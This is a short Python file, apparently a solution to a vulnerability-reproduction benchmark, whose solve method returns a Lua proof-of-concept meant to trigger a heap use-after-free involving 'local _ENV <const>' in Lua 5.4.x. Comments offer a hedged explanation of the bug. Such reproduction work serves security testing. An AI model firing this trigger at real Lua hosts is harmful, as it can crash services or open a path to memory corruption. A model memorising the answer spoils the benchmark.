import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Lua 5.4.x
        related to 'local _ENV <const>'.
        """
        # The vulnerability exists because declaring _ENV as a const local variable causes
        # the Lua compiler/parser to mishandle the upvalue management for it. Specifically,
        # it may fail to properly close the upvalue or mark it as escaping, leaving a
        # dangling reference to the stack slot.
        #
        # When the function returns, the stack frame is invalidated. If we allocate a heap
        # object (table) to _ENV, and the upvalue management is broken, the GC may collect
        # the table because it doesn't see the upvalue reference, or the upvalue points
        # to a dead stack slot. Accessing it triggers a Use-After-Free.
        
        poc = (
            b"local function exploit()\n"
            b"  local function factory()\n"
            b"    -- Declare _ENV as a const local table. The <const> triggers the compiler bug.\n"
            b"    local _ENV <const> = { x = 1 }\n"
            b"    -- Return a closure that accesses _ENV. This creates an upvalue.\n"
            b"    return function()\n"
            b"      return _ENV.x\n"
            b"    end\n"
            b"  end\n"
            b"\n"
            b"  local c = factory()\n"
            b"  -- Force garbage collection. If the upvalue tracking is broken, the table\n"
            b"  -- assigned to _ENV may be collected.\n"
            b"  collectgarbage()\n"
            b"  collectgarbage()\n"
            b"\n"
            b"  -- Access the closure. This accesses the dangling upvalue/freed memory.\n"
            b"  c()\n"
            b"end\n"
            b"\n"
            b"exploit()\n"
        )
        return poc